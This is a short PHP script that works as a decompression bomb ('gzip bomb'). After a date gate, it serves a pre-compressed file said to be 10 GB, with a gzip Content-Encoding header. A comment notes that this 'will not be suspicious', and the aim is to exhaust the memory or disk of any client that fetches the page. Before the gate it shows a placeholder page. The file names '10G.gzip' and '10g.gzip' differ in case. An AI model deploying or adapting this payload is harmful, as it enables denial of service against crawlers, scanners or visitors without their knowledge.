<?php 
//prepare the client to recieve GZIP data. This will not be suspicious 
//since most web servers use GZIP by default 
$day = !empty($_GET['day']) ? intval($_GET['day']) : intval(date('Ymd'));
if($day <= 20200715){
	echo <<<EOT
<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8" />
    <title>this is a gzip bomp!</title>
    <meta name="generator" content="EverEdit" />
    <meta name="author" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
</head>
<body>
    <h1>this is a gzip bomp!</h1>
</body>
</html>
EOT;
} else {
	header("Content-Encoding: gzip"); 
	header("Content-Length: ".filesize('10G.gzip')); 
	//Turn off output buffering 
	if (ob_get_level()) ob_end_clean();
	//send the gzipped file to the client 
	readfile('10g.gzip');
}